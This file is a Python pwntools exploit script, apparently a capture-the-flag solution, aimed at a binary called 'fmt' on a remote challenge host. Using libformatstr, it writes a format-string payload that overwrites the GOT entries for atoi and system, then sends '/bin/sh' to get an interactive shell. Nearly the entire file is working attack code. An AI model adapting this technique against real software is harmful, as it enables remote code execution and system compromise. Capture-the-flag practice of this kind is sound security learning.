from pwn import *
from libformatstr import *


binary = './fmt'
# p = process(binary)
# p = remote('localhost', 5002)
p = remote('pwn.byteband.it', 6969)
elf = ELF(binary)

s = '''
init-pwndbg
b *0x4012d5
'''

# gdb.attach(p, s)

p.sendlineafter('Choice: ', '2')
fmt = FormatStr(isx64=True)
offset = 6
fmt[elf.got['atoi']] = p64(0x401056) # system@plt + 6
fmt[elf.got['system']] = 0x004011f7


# p.sendline('AAAABBBB' + '.%p' * 10)
p.sendline(fmt.payload(offset) + '\x00')

p.sendlineafter('Choice:', '/bin/sh')

p.interactive()
